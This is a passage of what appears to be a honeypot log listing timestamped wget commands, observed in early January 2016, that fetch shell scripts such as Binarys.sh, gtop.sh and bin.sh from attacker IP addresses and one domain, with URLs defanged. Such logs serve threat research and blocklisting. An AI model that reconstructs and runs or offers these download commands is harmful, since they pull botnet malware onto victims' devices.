hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-08 17:33:44 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-08 17:19:57 | wget hxp:\/\/208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-08 16:57:53 | wget hxxp:\/\/ 208.67.1.142\/qbot\/Binarys . sh\u003Cbr \/\u003E2016-01-08 16:25:16 | wget ftx:\/\/51.254.238.19\/gb . sh\u003Cbr \/\u003E2016-01-08 15:39:48 | wget ftx:\/\/51.254.238.19\/gb . sh\u003Cbr \/\u003E2016-01-08 15:19:47 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-08 15:09:47 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-08 14:59:52 | wget ftx:\/\/51.254.238.19\/gb . sh\u003Cbr \/\u003E2016-01-08 14:29:56 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-08 14:19:51 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-08 14:01:43 | wget hxxp:\/\/ 185.62.189.11\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-08 13:51:37 | wget hxxp:\/\/ 185.62.189.11\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-08 13:09:57 | wget hxxp:\/\/ 185.130.5.246\/bin3 . sh\u003Cbr \/\u003E2016-01-08 12:51:41 | wget hxxp:\/\/ 208.67.1.142\/qbot\/Binarys . sh\u003Cbr \/\u003E2016-01-08 12:32:19 | wget hxxp:\/\/ 185.62.189.11\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-08 12:29:03 | wget hxxp:\/\/ 208.67.1.142\/qbot\/Binarys . sh\u003Cbr \/\u003E2016-01-08 12:22:09 | wget hxxp:\/\/ 185.62.189.11\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-08 12:19:37 | wget hxxp:\/\/ 208.67.1.142\/qbot\/Binarys . sh\u003Cbr \/\u003E2016-01-08 12:07:29 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-08 10:36:57 | wget hxxp:\/\/ 185.62.189.11\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-08 10:27:09 | wget hxxp:\/\/ 185.62.189.11\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-08 10:07:45 | wget hxxp:\/\/ 192.227.177.127\/gtop . sh\u003Cbr \/\u003E2016-01-08 09:54:24 | wget hxxp:\/\/ 185.62.189.11\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-08 09:44:30 | wget hxxp:\/\/ 185.62.189.11\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-08 08:43:10 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-01-08 08:43:10 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-01-08 08:28:11 | wget hxxp:\/\/ 185.130.5.246\/bin3 . sh\u003Cbr \/\u003E2016-01-08 01:20:08 | wget -q hxxp:\/\/ 198.23.238.251\/gb . sh\u003Cbr \/\u003E2016-01-08 00:58:02 | wget hxxp:\/\/ 185.130.5.246\/bin3 . sh\u003Cbr \/\u003E2016-01-08 00:51:41 | wget hxxp:\/\/ 185.130.5.246\/bin3 . sh\u003Cbr \/\u003E2016-01-07 23:35:21 | wget hxxp:\/\/ 185.62.189.11\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-07 23:25:51 | wget hxxp:\/\/ 185.62.189.11\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-07 21:40:10 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-07 21:30:41 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-07 19:37:00 | wget hxxp:\/\/ 192.227.170.67\/Binaries . sh\u003Cbr \/\u003E2016-01-07 16:10:32 | wget hxxp:\/\/ 192.227.177.127\/gtop . sh\u003Cbr \/\u003E2016-01-07 16:09:53 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-07 15:48:18 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-07 15:38:35 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-07 11:59:09 | wget hxxp:\/\/ 185.130.5.246\/bin3 . sh\u003Cbr \/\u003E2016-01-07 11:54:25 | wget hxxp:\/\/ 185.130.5.246\/bin3 . sh\u003Cbr \/\u003E2016-01-07 09:05:52 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-07 09:03:16 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-07 08:56:09 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-07 08:29:38 | wget hxxp:\/\/ 185.130.5.246\/bin . sh\u003Cbr \/\u003E2016-01-07 08:24:46 | wget hxxp:\/\/ 185.130.5.246\/bin . sh\u003Cbr \/\u003E2016-01-07 08:24:46 | wget hxxp:\/\/ 185.130.5.246\/bin . sh\u003Cbr \/\u003E2016-01-07 07:45:01 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-07 07:21:11 | wget hxxp:\/\/ 185.130.5.246\/bin . sh\u003Cbr \/\u003E2016-01-07 07:16:17 | wget hxxp:\/\/ 185.130.5.246\/bin . sh\u003Cbr \/\u003E2016-01-07 05:33:06 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-07 05:18:10 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-07 05:04:59 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-07 03:03:21 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-07 02:55:07 | wget hxxp:\/\/ 192.227.177.127\/gtop . sh\u003Cbr \/\u003E2016-01-07 02:43:59 | wget hxxp:\/\/ 192.227.170.67\/Binaries . sh\u003Cbr \/\u003E2016-01-07 02:32:13 | busybox wget hxxp:\/\/ 80.82.64.177\/fucks . sh\u003Cbr \/\u003E2016-01-07 02:32:13 | wget1 hxxp:\/\/ 80.82.64.177\/fucks2 . sh\u003Cbr \/\u003E2016-01-07 02:27:28 | busybox wget hxxp:\/\/ 80.82.64.177\/fucks . sh\u003Cbr \/\u003E2016-01-07 02:27:28 | wget1 hxxp:\/\/ 80.82.64.177\/fucks2 . sh\u003Cbr \/\u003E2016-01-07 00:14:11 | wget hxxp:\/\/ 192.227.177.127\/gtop . sh\u003Cbr \/\u003E2016-01-06 17:20:08 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-06 17:09:58 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-06 16:54:11 | wget hxxp:\/\/ 208.67.1.142\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-06 16:45:04 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-06 16:35:27 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-06 16:06:23 | wget hxxp:\/\/ 208.89.211.141\/cocks . sh-O \/tmp\/cocks . sh\u003Cbr \/\u003E2016-01-06 14:13:15 | wget hxxp:\/\/ 192.227.177.127\/gtop . sh\u003Cbr \/\u003E2016-01-06 13:27:48 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-06 13:18:09 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-06 10:41:35 | wget hxxp:\/\/ 192.227.177.127\/gtop . sh\u003Cbr \/\u003E2016-01-06 09:56:04 | wget hxxp:\/\/ \"freedomstress.com\"\/test\/Binarys . sh\u003Cbr \/\u003E2016-01-06 09:41:12 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-06 09:31:28 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-06 07:40:31 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-06 07:23:01 | wget -q hxxp:\/\/ 198.23.238.251\/gb . sh\u003Cbr \/\u003E2016-01-06 07:10:37 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-06 05:49:41 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-06 05:40:06 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-06 05:29:56 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-01-06 05:29:55 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-01-06 05:23:13 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-06 05:13:42 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-06 03:21:23 | wget hxxp:\/\/ 5.196.249.163\/IRC\/loldongs . sh\u003Cbr \/\u003E2016-01-06 03:12:31 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-06 02:12:26 | wget hxxp:\/\/ 79.143.181.158\/gtop . sh\u003Cbr \/\u003E2016-01-06 02:03:21 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-06 01:53:42 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-06 01:41:14 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-06 01:28:19 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-06 01:18:00 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-06 01:15:55 | wget hxxp:\/\/ 79.143.181.158\/gtop . sh\u003Cbr \/\u003E2016-01-06 01:08:28 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-05 23:10:08 | wget -q hxxp:\/\/ 198.23.238.251\/gb . sh\u003Cbr \/\u003E2016-01-05 21:29:35 | wget hxxp:\/\/ 208.89.211.141\/cocks . sh-O \/tmp\/cocks . sh\u003Cbr \/\u003E2016-01-05 20:59:37 | wget hxxp:\/\/ 208.89.211.141\/cocks . sh-O \/tmp\/cocks . sh\u003Cbr \/\u003E2016-01-05 20:46:16 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-05 20:39:07 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-05 16:04:50 | wget hxxp:\/\/ 79.143.181.158\/gtop . sh\u003Cbr \/\u003E2016-01-05 15:34:17 | wget hxxp:\/\/ 79.143.181.158\/gtop . sh\u003Cbr \/\u003E2016-01-05 15:09:05 | wget hxxp:\/\/ 79.143.181.158\/gtop . sh\u003Cbr \/\u003E2016-01-05 14:41:42 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-05 14:31:48 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-05 12:01:48 | wget hxxp:\/\/ 79.143.181.158\/gtop . sh\u003Cbr \/\u003E2016-01-05 11:59:21 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-05 11:53:10 | wget hxxp:\/\/ 192.227.177.120\/gtop . sh\u003Cbr \/\u003E2016-01-05 11:49:54 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-05 11:25:12 | wget hxxp:\/\/ 192.227.177.120\/gtop . sh\u003Cbr \/\u003E2016-01-05 10:35:24 | wget hxxp:\/\/ 192.243.109.128\/gtop . sh\u003Cbr \/\u003E2016-01-05 10:31:15 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-05 10:21:44 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-05 10:15:52 | wget hxxp:\/\/ 192.243.109.128\/gtop . sh\u003Cbr \/\u003E2016-01-05 09:59:50 | wget hxxp:\/\/ 192.227.177.120\/gtop . sh\u003Cbr \/\u003E2016-01-05 09:33:56 | wget hxxp:\/\/ 192.227.177.120\/gtop . sh\u003Cbr \/\u003E2016-01-05 08:32:41 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-01-05 08:32:39 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-01-05 06:50:33 | wget hxxp:\/\/ 192.227.177.120\/gtop . sh\u003Cbr \/\u003E2016-01-05 06:19:51 | wget hxxp:\/\/ 192.227.177.120\/gtop . sh\u003Cbr \/\u003E2016-01-05 05:44:13 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-05 05:39:30 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-05 05:29:53 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-05 04:56:17 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-05 04:53:55 | wget hxxp:\/\/ 192.227.177.120\/gtop . sh\u003Cbr \/\u003E2016-01-05 04:46:35 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-05 04:05:33 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-05 02:54:58 | wget hxxp:\/\/ 208.67.1.40\/bin . sh\u003Cbr \/\u003E2016-01-05 02:29:16 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-05 02:19:36 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-05 01:54:59 | wget hxxp:\/\/ 192.227.177.120\/gtop . sh\u003Cbr \/\u003E2016-01-05 01:21:44 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-05 00:42:52 | wget hxxp:\/\/ 192.227.177.120\/gtop . sh\u003Cbr \/\u003E2016-01-05 00:26:00 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-05 00:18:06 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-04 23:58:53 | wget hxxp:\/\/ 192.227.177.120\/gtop . sh\u003Cbr \/\u003E2016-01-04 23:52:47 | wget hxxp:\/\/ 192.227.177.120\/gtop . sh\u003Cbr \/\u003E2016-01-04 23:25:16 | wget hxxp:\/\/ 192.227.177.120\/gtop . sh\u003Cbr \/\u003E2016-01-04 23:19:40 | wget hxxp:\/\/ 208.89.211.141\/cocks . sh-O \/tmp\/cocks . sh\u003Cbr \/\u003E2016-01-04 23:02:18 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-04 22:52:35 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-04 22:42:39 | wget hxxp:\/\/ 192.227.177.120\/gtop . sh\u003Cbr \/\u003E2016-01-04 22:35:24 | wget hxxp:\/\/ 192.227.177.120\/gtop . sh\u003Cbr \/\u003E2016-01-04 22:34:48 | wget hxxp:\/\/ 208.89.211.141\/cocks . sh-O \/tmp\/cocks . sh\u003Cbr \/\u003E2016-01-04 22:17:31 | wget hxxp:\/\/ 208.89.211.141\/cocks . sh-O \/tmp\/cocks . sh\u003Cbr \/\u003E2016-01-04 21:05:28 | wget hxxp:\/\/ 23.94.29.218\/run . sh\u003Cbr \/\u003E2016-01-04 20:53:42 | wget hxxp:\/\/ 192.227.177.120\/gtop . sh\u003Cbr \/\u003E2016-01-04 20:13:45 | wget hxxp:\/\/ 45.32.232.197\/gay\/bin . sh\u003Cbr \/\u003E2016-01-04 19:56:29 | wget hxxp:\/\/ 45.32.232.197\/gay\/bin . sh\u003Cbr \/\u003E2016-01-04 19:20:14 | wget hxxp:\/\/ 192.227.177.120\/gtop . sh\u003Cbr \/\u003E2016-01-04 18:56:34 | wget hxxp:\/\/ 192.227.177.120\/gtop . sh\u003Cbr \/\u003E2016-01-04 17:01:19 | wget hxxp:\/\/ 23.94.29.218\/run . sh\u003Cbr \/\u003E2016-01-04 16:34:40 | wget hxxp:\/\/ 192.227.177.120\/gtop . sh\u003Cbr \/\u003E2016-01-04 16:06:50 | wget hxxp:\/\/ 192.227.177.120\/gtop . sh\u003Cbr \/\u003E2016-01-04 11:01:49 | wget hxxp:\/64.20.33.134\/gtop . sh\u003Cbr \/\u003E2016-01-04 09:11:33 | wget hxxp:\/\/ 45.32.232.197\/gay\/bin . sh\u003Cbr \/\u003E2016-01-04 08:38:44 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-04 08:29:09 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-04 08:26:16 | wget hxxp:\/\/ 45.32.232.197\/gay\/bin . sh\u003Cbr \/\u003E2016-01-04 08:16:25 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-04 07:50:23 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-04 07:36:44 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-01-04 07:36:44 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-01-04 07:13:31 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-04 07:03:49 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-04 02:34:18 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-04 02:28:42 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-04 02:18:48 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-04 02:03:32 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-04 01:21:29 | wget hxxp:\/\/ 192.227.177.120\/gtop . sh\u003Cbr \/\u003E2016-01-04 00:52:14 | wget hxxp:\/\/ 192.227.177.120\/gtop . sh\u003Cbr \/\u003E2016-01-03 23:27:40 | wget hxxp:\/\/ 192.227.177.120\/gtop . sh\u003Cbr \/\u003E2016-01-03 23:25:27 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-03 23:16:17 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-03 23:13:08 | wget hxxp:\/\/ 192.227.177.120\/gtop . sh\u003Cbr \/\u003E2016-01-03 23:01:48 | wget hxxp:\/\/ 192.227.177.120\/gtop . sh\u003Cbr \/\u003E2016-01-03 12:40:30 | wget -q hxxp:\/\/ 208.67.1.165\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-03 12:14:32 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-03 12:04:56 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-03 10:42:45 | wget hxxp:\/\/ 192.227.177.120\/gtop . sh\u003Cbr \/\u003E2016-01-03 10:31:57 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-03 10:20:26 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-03 09:25:51 | wget hxxp:\/\/ 208.67.1.40\/bin . sh\u003Cbr \/\u003E2016-01-03 09:03:19 | wget -q hxxp:\/\/ 198.23.238.203\/tel . sh\u003Cbr \/\u003E2016-01-03 08:31:45 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-03 08:11:11 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-03 08:01:24 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-03 07:57:40 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-03 07:17:10 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-01-03 07:17:10 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-01-03 06:31:16 | wget hxxp:\/\/ freedomstress.com\/test\/Binarys . sh\u003Cbr \/\u003E2016-01-03 06:12:38 | wget -q hxxp:\/\/ 198.23.238.203\/tel . sh\u003Cbr \/\u003E2016-01-03 06:01:00 | wget -q hxxp:\/\/ 198.23.238.203\/tel . sh\u003Cbr \/\u003E2016-01-03 05:55:18 | wget hxxp:\/\/ freedomstress.com\/test\/Binarys . sh\u003Cbr \/\u003E2016-01-03 05:20:40 | wget hxxp:\/\/ 192.227.177.120\/gtop . sh\u003Cbr \/\u003E2016-01-03 05:06:29 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-03 04:59:35 | wget hxxp:\/\/ 192.227.177.120\/gtop . sh\u003Cbr \/\u003E2016-01-03 04:57:56 | wget -q hxxp:\/\/ 198.23.238.203\/tel . sh\u003Cbr \/\u003E2016-01-03 04:52:15 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-03 04:23:22 | wget hxxp:\/\/ 192.227.177.120\/gtop . sh\u003Cbr \/\u003E2016-01-03 04:18:00 | wget hxxp:\/\/ 192.227.177.120\/gtop . sh\u003Cbr \/\u003E2016-01-03 04:16:34 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-03 03:55:01 | wget hxxp:\/\/ 192.227.177.120\/gtop . sh\u003Cbr \/\u003E2016-01-03 03:49:30 | wget hxxp:\/\/ 192.227.177.120\/gtop . sh\u003Cbr \/\u003E2016-01-03 03:32:56 | wget hxxp:\/\/ 192.227.177.120\/gtop . sh\u003Cbr \/\u003E2016-01-03 03:25:28 | wget 93.171.158.242\/rget . sh\u003Cbr \/\u003E2016-01-03 03:20:45 | wget hxxp:\/\/ 192.227.177.120\/gtop . sh\u003Cbr \/\u003E2016-01-03 02:48:19 | wget hxxp:\/\/ 192.227.177.120\/gtop . sh\u003Cbr \/\u003E2016-01-03 02:37:05 | wget hxxp:\/\/ freedomstress.com\/test\/Binarys . sh\u003Cbr \/\u003E2016-01-03 02:16:46 | wget hxxp:\/\/ 192.227.177.120\/gtop . sh\u003Cbr \/\u003E2016-01-03 01:41:23 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-03 01:40:33 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-03 01:07:29 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-03 00:14:45 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-03 00:13:17 | wget hxxp:\/\/ 208.67.1.40\/bin . sh\u003Cbr \/\u003E2016-01-03 00:05:15 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-02 23:16:45 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-02 22:59:48 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-02 17:36:24 | wget ftx:\/\/185.62.190.156\/gtop . sh\u003Cbr \/\u003E2016-01-02 17:29:21 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-02 17:28:24 | wget ftx:\/\/185.62.190.156\/gtop . sh\u003Cbr \/\u003E2016-01-02 17:19:41 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-02 14:57:11 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-02 14:47:23 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-02 11:36:27 | wget hxxp:\/\/ freedomstress.com\/test\/Binarys . sh\u003Cbr \/\u003E2016-01-02 11:18:28 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-02 11:03:35 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-02 09:17:34 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-01-02 09:17:33 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-01-02 08:59:56 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-02 08:42:30 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-02 08:17:15 | wget -q hxxp:\/\/ 198.23.238.203\/tel . sh\u003Cbr \/\u003E2016-01-02 08:12:53 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-02 07:55:07 | wget -q hxxp:\/\/ 198.23.238.203\/tel . sh\u003Cbr \/\u003E2016-01-02 07:39:18 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-02 07:28:20 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-02 07:10:25 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-02 07:07:38 | wget -q hxxp:\/\/ 198.23.238.203\/tel . sh\u003Cbr \/\u003E2016-01-02 06:27:05 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-02 06:17:35 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-02 04:40:30 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-02 04:36:11 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-02 04:32:52 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-02 04:26:31 | wget hxxp:\/\/ 185.62.190.156\/gtop . sh\u003Cbr \/\u003E2016-01-02 04:16:45 | wget hxxp:\/\/ 94.102.53.144\/bin . sh\u003Cbr \/\u003E2016-01-02 04:05:06 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-02 03:55:00 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-02 03:46:59 | wget hxxp:\/\/ 198.12.97.93\/Bot\/stun . sh\u003Cbr \/\u003E2016-01-02 03:08:46 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-01-02 03:08:44 | wget -q hxxp:\/\/ 199.180.133.214\/Sharky\/gb . sh\u003Cbr \/\u003E2016-01-02 00:47:56 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-02 00:25:43 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-02 00:16:05 | wget hxxp:\/\/ 208.67.1.3\/DOGDICKS\/Binarys . sh\u003Cbr \/\u003E2016-01-01 23:31:25 | wget hxxp:\/\/ 185.62.190.156\/gtop . sh\u003Cbr \/\u003E2016-01-01 23:11:10 | wget hxxp:\/\/ 